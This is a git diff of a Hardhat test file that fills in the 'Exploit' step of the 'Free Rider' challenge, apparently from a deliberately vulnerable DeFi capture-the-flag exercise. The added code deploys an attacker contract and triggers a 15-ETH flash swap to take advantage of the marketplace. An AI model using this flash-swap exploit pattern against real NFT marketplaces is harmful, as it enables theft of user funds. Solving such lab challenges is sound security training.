@@ -104,7 +104,23 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Deploying FreeRiderCracker.sol
+        let frc = await (await ethers.getContractFactory("FreeRiderCracker", attacker)).deploy(
+            this.weth.address,
+            this.uniswapFactory.address,
+            this.marketplace.address,
+            this.uniswapRouter.address, 
+            this.token.address,
+            this.nft.address,
+            this.buyerContract.address
+        );
+
+        let flashAmount = ethers.utils.parseEther("15");
+
+        // console.log(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapPair.address)));
+        await frc.connect(attacker).flashSwap(this.weth.address, flashAmount);
+
+
     });
 
     after(async function () {
